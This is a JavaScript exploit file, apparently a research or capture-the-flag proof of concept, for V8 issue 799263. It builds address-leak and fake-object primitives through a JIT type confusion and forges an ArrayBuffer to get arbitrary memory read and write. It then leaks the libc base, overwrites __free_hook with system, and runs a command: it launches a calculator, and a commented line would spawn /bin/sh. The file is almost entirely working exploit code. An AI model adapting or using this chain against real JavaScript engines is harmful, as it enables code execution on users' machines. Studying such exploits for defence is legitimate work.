/*************************************************************
 * File Name: exp.js
 * 
 * Created on: 2020-05-21 04:21:08
 * Author: raycp
 * 
 * Last Modified: 2020-05-21 06:02:30
 * Description: exp for issue 799263
************************************************************/
const MAX_ITERATIONS = 10000;
const buf = new ArrayBuffer(8);
const f64 = new Float64Array(buf);
const u32 = new Uint32Array(buf);
// Floating point to 64-bit unsigned integer
function f2i(val)
{ 
    f64[0] = val;
    let tmp = Array.from(u32);
    return tmp[1] * 0x100000000 + tmp[0];
}
// 64-bit unsigned integer to Floating point
function i2f(val)
{
    let tmp = [];
    tmp[0] = parseInt(val % 0x100000000);
    tmp[1] = parseInt((val - tmp[0]) / 0x100000000);
    u32.set(tmp);
    return f64[0];
}
// 64-bit unsigned integer to hex
function hex(i)
{
    return "0x"+i.toString(16).padStart(16, "0");
}

function wasm_func() {
    var wasmImports = {
        env: {
            puts: function puts (index) {
                print(utf8ToString(h, index));
            }
        }
    };
    var buffer = new Uint8Array([0,97,115,109,1,0,0,0,1,137,128,128,128,0,2,
        96,1,127,1,127,96,0,0,2,140,128,128,128,0,1,3,101,110,118,4,112,117,
        116,115,0,0,3,130,128,128,128,0,1,1,4,132,128,128,128,0,1,112,0,0,5,
        131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,146,128,128,128,0,2,6,
        109,101,109,111,114,121,2,0,5,104,101,108,108,111,0,1,10,141,128,128,
        128,0,1,135,128,128,128,0,0,65,16,16,0,26,11,11,146,128,128,128,0,1,0,
        65,16,11,12,72,101,108,108,111,32,87,111,114,108,100,0]);
    let m = new WebAssembly.Instance(new WebAssembly.Module(buffer),wasmImports);
    let h = new Uint8Array(m.exports.memory.buffer);
    return m.exports.hello;
}

wasm_obj = wasm_func();
// %DebugPrint(wasm_obj);
// %SystemBreak();


function gc()
{
    for(let i=0;i<0x10;i++)
    {
        new Array(0x1000000);
    }
}

function string2uint(string)
{
    let uint_arr = []
    for(let i=0; i<string.length; i++) {
        uint_arr.push(string.charCodeAt(i));
    }
    return uint_arr;
}


// create a jit function
var jit_obj = new Function("var a = 1000000");
// %DebugPrint(jit_obj);
// %SystemBreak();
function addr_of(obj) 
{
    eval(`
        function foo(a, b, obj) {
            b[0] = 0;
            a.length;

            a[0] = obj;
            
            return b[0];
        }
    `);

    let arr_addr_of = new Array(1);
    arr_addr_of[0] = 'a';

    for(let i=0; i<MAX_ITERATIONS; i++) {
        eval(`var tmp_arr = [1.1];`);
        foo(arr_addr_of, [0.1], {});
        foo(tmp_arr, [0.1], {});
    }
    // let arr2 =[1.1];
    eval(`var float_arr = [1.1];`);
    return f2i(foo(float_arr, float_arr, obj));
}


function fake_obj(addr)
{

    eval(`
        function foo(a, b) {
            b[0] = 0;
            a.length;

            a[0] = 0;
            
            b[0] = addr;
        }
    `);

    let arr_fake_obj = new Array(1);
    arr_fake_obj[0] = 'a';

    for(let i=0; i<MAX_ITERATIONS; i++) {
        eval(`var tmp_arr = [1.1];`);
        foo(arr_fake_obj, [0.1]);
        foo(tmp_arr, [0.1]);
    }
    eval(`var float_arr = [1.1];`);
    foo(float_arr, float_arr);
    return float_arr[0];
}


var ab = new ArrayBuffer(200);
// %DebugPrint(ab);
// %SystemBreak();
// array to build fake ArrayBuffer map
var fake_ab_map = [
    i2f(0xdaba0000daba0000), // map, whatever;
    i2f(0x1900042317080808),
    i2f(0x00000000084003ff),
    1.1, // prototype
    2.2, // constructor
    i2f(0)
].splice(0)

// array to build fake ArrayBuffer
var fake_ab = [
    1.1, // ArrayBuffer Map;
    2.2,  // properties (whatever);
    3.3,  // elements (whatever);
    i2f(0x40000000000), // length 0x400
    4.4, // backing store;
    i2f(0x0000000000000002), // copy form ab stucture
    i2f(0),
    i2f(0)
].splice(0)

// trigger gc to mov the upper data to old space
gc();
gc();

// step 1. get the prototype of ArrayBuffer Map
var ab_map_proto_addr = addr_of(ab.__proto__);
var ab_map_construct_addr = ab_map_proto_addr - 0x1a0;
print("[+] ArrayBuffer Map prototype addr: 0x"+hex(ab_map_proto_addr));
print("[+] ArrayBuffer Map Constructor addr: 0x"+hex(ab_map_construct_addr));
// %DebugPrint(ab);
// %SystemBreak();
// step 2. use the ab_map_proto_addr and ab_map_construct_addr to build fake ArrayBuffer Map
// %DebugPrint(fake_ab_map);
// %SystemBreak();
fake_ab_map[3] = i2f(ab_map_proto_addr);
fake_ab_map[4] = i2f(ab_map_construct_addr);

// step 3. get the fake ArrayBuffer Map elements' addr
var fake_ab_map_addr = addr_of(fake_ab_map) - 0x50; // elements addr of fake_ab_map
print("[+] fake ArrayBuffer Map addr: 0x"+hex(fake_ab_map_addr));

// step 4. use the fakeABMapAddr to build fakeAB;
fake_ab[0] = i2f(fake_ab_map_addr);
fake_ab[1] = i2f(fake_ab_map_addr);
// %DebugPrint(fake_ab_map);
// %SystemBreak();

// step 5. get the fake ArrayBuffer elements' addr
var fake_ab_addr = addr_of(fake_ab) - 0x40 ; // elements addr of fakeAB
print ("[+] fake ArrayBuffer addr: 0x"+hex(fake_ab_addr));
// %DebugPrint(fake_ab);
// %SystemBreak();

// step 6. get fake ArrayBuffer object with fake_obj primitive
var fake_ab_obj = fake_obj(i2f(fake_ab_addr));
// %DebugPrint(fake_ab_obj);
// print(fake_ab_obj);
// %SystemBreak();

// step 7. build DataView obj
var data_view = new DataView(fake_ab_obj);
// %DebugPrint(fake_ab_obj);
// %DebugPrint(ab);
// %SystemBreak()

// aar primitive
function data_view_read64(addr)
{
    fake_ab[4] = i2f(addr); // overwrite fakeAB[4], which is corresponding to backing store pointer

    return f2i(data_view.getFloat64(0, true));
}

// aaw primitive
function data_view_write64(addr, val) {
    fake_ab[4] = i2f(addr); // overwrite fakeAB[4], which is corresponding to backing store pointer
    data_view.setFloat64(0, i2f(val), true);
}

// aaw primitive
function data_view_write(addr, payload)
{

    fake_ab[4] = i2f(addr);

    for (let i=0; i<payload.length; i++) {
        data_view.setUint8(i, payload[i]);
    }
    return ;
}

// step 8. leak the addr of libc
var jit_obj_addr = addr_of(jit_obj) - 1;
print("[+] jit obj addr:" + hex(jit_obj_addr));
var code_addr = data_view_read64(jit_obj_addr + 0x30)-1;
print("[+] code addr: " + hex(code_addr));

var text_addr = data_view_read64(code_addr + 0xae);
print("[+] leaked text addr: " + hex(text_addr));
var text_base = text_addr - 0x7b0420;
print("[+] text base: " + hex(text_base));
var printf_got = text_base + 0xb69838;
var printf_addr = data_view_read64(printf_got);
var libc_base = printf_addr - 0x64e80;
print("[+] libc base: " + hex(libc_base));
var free_hook_addr = libc_base + 0x3ed8e8;
print("[+] free hook addr: " + hex(free_hook_addr));
var system_addr = libc_base + 0x4f440;
print("[+] system addr: "+ hex(system_addr));
/*
 * debug version leak plan

var libv8_addr = data_view_read64(code_addr + 0xf8);
print("[+] libv8 addr: " + hex(libv8_addr));
%SystemBreak();
var libv8_base = libv8_addr - 0x19bb660;
print("[+] libv8 base: " + hex(libv8_base));
var printf_got = libv8_base + 0x1fdb130;
var printf_addr = data_view_read64(printf_got);
var libc_base = printf_addr - 0x64e80;
print("[+] libc base: " + hex(libc_base));
var free_hook_addr = libc_base + 0x3ed8e8;
print("[+] free hook addr: " + hex(free_hook_addr));
var system_addr = libc_base + 0x4f440;
print("[+] system addr: "+ hex(system_addr));
*/

// step 9. overwrite free_hook to system
data_view_write64(free_hook_addr, system_addr);

// step 10. trigger free to execute command
function cmd_execute(cmd)
{
    var cmd_buffer = new ArrayBuffer(0x1000);
    var cmd_dataview = new DataView(cmd_buffer);
    // %DebugPrint(cmd_buffer);
    // %SystemBreak();
    cmd_arr = string2uint(cmd);
    for(let i=0; i<cmd_arr.length; i++) {
        cmd_dataview.setUint8(i, cmd_arr[i]);
    }
	// get_shell_dataview.setFloat64(0, i2f(0x0068732f6e69622f), true); // str --> /bin/sh\x00
    // get_shell_dataview.setFloat64(0, i2f(0x69622f70616e732f), true); // /snap/bi
    // get_shell_dataview.setFloat64(8, i2f(0x2d656d6f6e672f6e), true); // n/gnome-
    // get_shell_dataview.setFloat64(16, i2f(0x74616c75636c6163), true); // calculat
    // get_shell_dataview.setFloat64(24, i2f(0x726f), true); // or
    // %DebugPrint(cmd_buffer);
    // %SystemBreak();


}
// cmd_execute("/bin/sh\x00");
cmd_execute("/snap/bin/gnome-calculator\x00");
